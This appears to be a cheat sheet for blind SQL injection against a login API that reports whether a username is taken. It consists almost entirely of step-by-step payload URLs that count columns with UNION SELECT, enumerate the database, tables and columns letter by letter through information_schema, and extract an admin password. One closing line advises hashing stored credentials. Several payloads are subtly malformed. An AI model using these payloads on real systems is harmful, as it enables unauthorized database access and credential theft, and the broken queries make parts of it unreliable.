/* Hard - Try in login forms where there is an API **
** Blind SQL Injection **
**(where no error messages are being displayed, **
** we are taking advantage of an API's output **
** that informs us if a username is taken **
** {true} or not {false})*/

/*STEP 1 - Always try standard usernames like 'admin', 'administrator', 'sa', 'root', 'superuser', etc.*/
--Use the API to check users :
http://my.vulnerablesite.com/checkuser?username=admin [if this returns true, we need to find a username that returns false]
http://my.vulnerablesite.com/checkuser?username=nouser [this is returns false - user doesn't exist]

/*STEP 2 - Find columns of current table*/
--We assume that this parameter queries user table, so we use UNION to find number of columns in the table:
http://my.vulnerablesite.com/checkuser?username=nouser' UNION SELECT 1;-- [if get {false} in API, add columns]
http://my.vulnerablesite.com/checkuser?username=nouser' UNION SELECT 1,2,3,...n;-- [until you get {true} - in this example, it's 3]

/*STEP 3 - Start enumerating*/
--Search for DB:
http://my.vulnerablesite.com/checkuser?username=nouser' UNION SELECT 1,2,database() where database like 'a%';--
http://my.vulnerablesite.com/checkuser?username=nouser' UNION SELECT 1,2,database() where database like 'sa%';-- [found 's' as first letter; searching for the rest]
[test all characters one by one, until it returns true. In this case, db is 'sitedb']

--Search for tables in DB:
http://my.vulnerablesite.com/checkuser?username=nouser' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sitedb' and table_name like 'a%';--
[test all characters one by one, until it returns true. In this case, found 'users' table]

--Enumerate columns in table 'users':
--Find first column (not necessarily in the right order!)
http://my.vulnerablesite.com/checkuser?username=nouser' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sitedb' and TABLE_NAME='users' and COLUMN_NAME like 'a%';--
[test all characters one by one, until it returns true. In this case, found 'id' column]

--Find second column (not necessarily in the right order!)
http://my.vulnerablesite.com/checkuser?username=nouser' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sitedb' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME != 'id';--
[test all characters one by one, until it returns true. In this case, found 'username' column]

--Find third column (not necessarily in the right order!)
http://my.vulnerablesite.com/checkuser?username=nouser' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sitedb' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME != 'id' and COLUMN_NAME != 'username';--
[test all characters one by one, until it returns true. In this case, found 'password' column]

--Find other columns (if exist), using the above mentioned methodology

--Search for 'admin', 'administrator', 'sa', 'root', 'superuser', etc. in table 'users':
http://my.vulnerablesite.com/checkuser?username=nouser' UNION SELECT 1,2,3 from users where username like 'a%;--
[test all characters one by one, until it returns true. In this case, found 'admin' username]

--Search for admin's password in table 'users':
http://my.vulnerablesite.com/checkuser?username=nouser' UNION SELECT 1,2,3 from users where username = 'admin' and password like 'a%';--
[test all characters one by one, until it returns true. In this case, found admin's password to be 'Irock217']


****ATTN: When using credentials stored in DB always hash them! Never leave them as plaintext! ****
